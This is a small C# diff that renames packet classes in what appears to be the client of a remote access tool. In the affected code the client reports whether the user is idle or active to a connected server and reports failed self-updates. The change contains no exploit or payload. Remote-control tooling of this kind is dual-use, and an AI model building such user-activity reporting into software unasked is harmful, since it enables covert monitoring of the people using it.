@@ -372,7 +372,7 @@ namespace xClient.Core
                     if (LastStatus != "Idle")
                     {
                         LastStatus = "Idle";
-                        new Packets.ClientPackets.UserStatus(LastStatus).Execute(Program.ConnectClient);
+                        new Packets.ClientPackets.SetUserStatus(LastStatus).Execute(Program.ConnectClient);
                     }
                 }
                 else
@@ -380,7 +380,7 @@ namespace xClient.Core
                     if (LastStatus != "Active")
                     {
                         LastStatus = "Active";
-                        new Packets.ClientPackets.UserStatus(LastStatus).Execute(Program.ConnectClient);
+                        new Packets.ClientPackets.SetUserStatus(LastStatus).Execute(Program.ConnectClient);
                     }
                 }
             }
@@ -575,7 +575,7 @@ namespace xClient.Core
             catch (Exception ex)
             {
                 DeleteFile(newFile);
-                new Packets.ClientPackets.Status(string.Format("Update failed: {0}", ex.Message)).Execute(c);
+                new Packets.ClientPackets.SetStatus(string.Format("Update failed: {0}", ex.Message)).Execute(c);
             }
         }
 
